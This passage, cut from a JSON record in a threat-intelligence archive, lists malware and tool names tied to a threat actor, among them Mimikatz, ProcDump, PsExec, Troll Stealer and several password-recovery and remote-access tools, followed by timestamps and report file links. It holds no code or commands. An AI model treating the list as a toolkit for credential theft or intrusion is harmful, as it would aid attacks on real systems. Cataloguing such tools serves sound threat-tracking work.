                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1685930802066,
    "ts_updated_at": 1732241012014,
    "ts_creation_date": 1685886683000,
    "ts_modification_date": 1685886683000,
    "files": {
        "pdf": "https://archive.orkl.eu/b7b7062157a6f8a803a4c7b071cd543471080967.pdf",
        "text": "https://archive.orkl.eu/b7b7062157a6f8a803a4c7b071cd543471080967.txt",
        "img": "https://archive.orkl.eu/b7b7062157a6f8a803a4c7b071cd543471080967.jpg"
    }
}